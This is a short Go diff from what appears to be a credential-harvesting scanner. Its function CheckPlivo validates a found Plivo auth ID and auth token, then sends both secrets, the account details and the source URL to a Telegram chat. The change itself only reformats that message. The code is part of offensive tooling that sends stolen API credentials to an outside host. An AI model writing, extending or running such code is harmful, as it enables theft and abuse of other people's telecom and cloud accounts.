@@ -61,7 +61,7 @@ func (a *AWSScanner) CheckPlivo(authID, authToken, sourceURL string) bool {
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("📞", "PLIVO", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>Auth ID:</b> <code>%s</code>\n🔐 <b>Auth Token:</b> <code>%s</code>\n👤 <b>Account:</b> %s\n", authID, authToken, info)
+		"Auth ID : %s\nAuth Token : %s\nAccount : %s\n", authID, authToken, info)
 	go a.sendTelegram(msg)
 	return true
 }
